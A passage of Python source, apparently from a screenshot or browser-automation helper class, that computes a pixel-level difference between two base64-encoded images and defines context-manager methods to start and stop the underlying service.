            before_img = Image.open(io.BytesIO(base64.b64decode(b64_before))).convert("RGB")
            after_img = Image.open(io.BytesIO(base64.b64decode(b64_after))).convert("RGB")

            # Resize to same dimensions if needed
            if before_img.size != after_img.size:
                after_img = after_img.resize(before_img.size)

            w, h = before_img.size
            bp = before_img.load()
            ap = after_img.load()

            diff_pixels = 0
            total_pixels = w * h
            diff_img = Image.new("RGB", (w, h))
            dp = diff_img.load()

            for y in range(h):
                for x in range(w):
                    br, bg, bb = bp[x, y]
                    ar, ag, ab = ap[x, y]
                    if (br, bg, bb) != (ar, ag, ab):
                        diff_pixels += 1
                        dp[x, y] = (255, 0, 0)  # red = changed
                    else:
                        dp[x, y] = (br, bg, bb)

            diff_score = diff_pixels / total_pixels if total_pixels else 0.0

            buf = io.BytesIO()
            diff_img.save(buf, format="PNG")
            diff_b64 = base64.b64encode(buf.getvalue()).decode("utf-8")

            return {
                "diff_score": round(diff_score, 4),
                "diff_bytes": len(buf.getvalue()),
                "diff_b64": diff_b64,
            }
        except Exception:
            return {"diff_score": 0.0, "diff_bytes": 0, "diff_b64": ""}

    # ── Context manager ─────────────────────────────────────────────

    def __enter__(self):
        self.ensure_running()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()
